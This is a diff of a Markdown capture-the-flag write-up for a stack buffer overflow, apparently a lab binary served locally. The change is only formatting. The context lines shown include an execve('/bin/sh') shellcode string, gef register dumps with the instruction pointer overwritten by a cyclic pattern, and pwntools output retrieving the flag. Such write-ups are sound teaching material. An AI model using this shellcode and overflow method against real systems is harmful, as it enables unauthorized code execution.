@@ -115,6 +115,7 @@ b'Thank you!\nflag{*****************}'
 >>> connect.close()
 [*] Closed connection to 127.0.0.1 port 1336
 
+```
 
 ```python
 
@@ -180,9 +181,7 @@ $esi   : 0x1
 $edi   : 0x8048340  →  <_start+0> xor ebp, ebp
 $eip   : 0x61616174 ("taaa"?)
 
-
-
-
+```
 
 Now we get the $esp address by running our payload (test2) with gef. It is `0xffffcf50`
 
@@ -245,9 +244,6 @@ $esp   : 0xffffcf50  →  0xffffcf00  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa
 "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
 
 ```
-
-
-
 
 We can interact with the binary with the python3 interpreter with the process() function. NOTE: using python3 we need to prefix with `b` for bytes cause python3 doesnt allow mixing strings and bytes, python did.
 
